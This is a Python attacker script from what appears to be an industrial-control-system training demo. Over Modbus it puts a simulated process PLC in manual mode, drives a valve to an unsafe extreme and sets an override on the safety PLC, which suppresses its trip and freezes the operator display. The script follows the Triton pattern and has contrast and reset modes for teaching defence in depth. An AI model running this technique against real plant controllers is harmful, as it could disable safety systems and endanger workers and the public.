"""Standalone external attacker — over Modbus, across the two PLCs.

This is the demo's attacker: a separate process that reaches the plant ONLY
over the Modbus network (exactly what the HMI and bridge use). The BPCS now
clamps an out-of-range operator setpoint, so the old off-scale-setpoint trick no
longer saturates the actuator. The evolved attack therefore drives the actuator
directly through MANUAL mode, and three contrasting modes are demonstrable:

  1. **Full attack (default).** Flip the BPCS to MANUAL (MAN_MODE) and drive
     MAN_OUT to the dangerous extreme (feed valve wide open, or the reactor's
     coolant valve shut) — this bypasses both the control law and the setpoint
     clamp — AND set SIS_OVERRIDE on the Safety PLC, which suppresses the trip
     and freezes the operator's HMI at its last nominal value. The process runs
     past failure while the HMI stays green.

  2. **Manual drive, SIS left armed (``--no-bypass``).** Same manual drive, but
     the SIS is NOT bypassed — the defence-in-depth contrast, where a healthy
     SIS trips and holds the process safe despite the manual actuator demand.

  3. **Setpoint tamper only (``--setpoint-only``).** Write an off-scale SETPOINT
     and nothing else. The BPCS clamps it to SP_HI and annunciates SP_CLAMPED;
     the process settles at the clamp (below trip for tank/vessel) — i.e. the
     naive attack is neutralised. (The reactor's exotherm still reaches its trip
     even at the clamp, so there its healthy SIS catches it instead.)

This is the Triton attack PATTERN expressed over Modbus (seize the control
actuator + force-override the safety logic), NOT Triton's TriStation/Triconex
program-injection MECHANISM — see OVERVIEW.md.

Usage (needs the venv + both PLCs reachable and RUNNING the scenario):
    .venv/bin/python -m attack.attack [tank|vessel|reactor]              # full attack
    .venv/bin/python -m attack.attack [tank|vessel|reactor] --no-bypass  # SIS armed
    .venv/bin/python -m attack.attack [tank|vessel|reactor] --setpoint-only
    .venv/bin/python -m attack.attack [tank|vessel|reactor] --reset      # stand down

``--reset`` returns to AUTO at the safe setpoint, clears the bypass, and pulses
the SIS RESET pushbutton to clear a latched trip (the reset only takes once the
PV has fallen a deadband below the trip; see plc/sis/sis.st).
"""

from __future__ import annotations

import os
import sys

from bridge.plc_io import ModbusPlc
from common import registers as R
from common import scenarios


def main() -> None:
    args = [a for a in sys.argv[1:]]
    reset = "--reset" in args
    setpoint_only = "--setpoint-only" in args
    no_bypass = "--no-bypass" in args
    positional = [a for a in args if not a.startswith("--")]
    sid = positional[0] if positional else \
        os.environ.get("PETROTWIN_SCENARIO", scenarios.DEFAULT_SCENARIO)
    sc = scenarios.get(sid)

    bpcs = ModbusPlc.for_instance(R.Instance.BPCS)
    sis = ModbusPlc.for_instance(R.Instance.SIS)
    try:
        if reset:
            bpcs.write_coil(R.BpcsCoil.MAN_MODE, False)
            bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.setpoint_reg)
            sis.write_coil(R.SisCoil.OVERRIDE, False)
            sis.write_coil(R.SisCoil.RESET, True)   # pulse the reset pushbutton
            sis.write_coil(R.SisCoil.RESET, False)
            sp = sc.reg_to_pv(bpcs.read_holding(R.BpcsHolding.SETPOINT))
            print(f"STAND DOWN [{sc.id}]: AUTO restored at {sp:g} {sc.pv_units}, "
                  f"SIS_OVERRIDE cleared, RESET pulsed. Baseline control resumes "
                  "next scan (trip clears once PV is back below the deadband).")
            return

        if setpoint_only:
            bpcs.write_holding(R.BpcsHolding.SETPOINT, sc.attack_setpoint_reg)
            print(f"SETPOINT TAMPER [{sc.id}]: BPCS setpoint forced off-scale — "
                  f"the BPCS clamps it to {sc.sp_hi:g} {sc.pv_units} (SP_CLAMPED). "
                  "The naive setpoint attack is neutralised; the process settles "
                  "at the clamp (the reactor still trips its healthy SIS).")
            return

        # Evolved driver — seize the actuator through MANUAL mode.
        bpcs.write_coil(R.BpcsCoil.MAN_MODE, True)
        bpcs.write_holding(R.BpcsHolding.MAN_OUT, sc.attack_manual_out_reg)
        pm = sc.attack_manual_out_reg
        print(f"ATTACK [{sc.id}]: BPCS forced to MANUAL, {sc.actuator} driven to "
              f"{pm/10:g}% — pushing {sc.pv_name} toward {sc.failure_word} "
              "(bypasses the control law and the setpoint clamp).")

        if no_bypass:
            print("  --no-bypass: SIS left ARMED. A healthy SIS should trip at "
                  f"{sc.trip_hh:g} {sc.pv_units} and hold the process safe.")
            return

        # Defeat the safety layer and freeze the operator's view.
        sis.write_coil(R.SisCoil.OVERRIDE, True)
        ov = sis.read_coil(R.SisCoil.OVERRIDE)
        print(f"  SIS_OVERRIDE set (override={ov}): trip suppressed, HMI frozen "
              "at its last nominal value (BYPASS ACTIVE annunciates).")
        print("  The HMI stays green; watch the 3D ground truth run to "
              f"{sc.failure_word}.")
    finally:
        bpcs.close()
        sis.close()


if __name__ == "__main__":
    main()
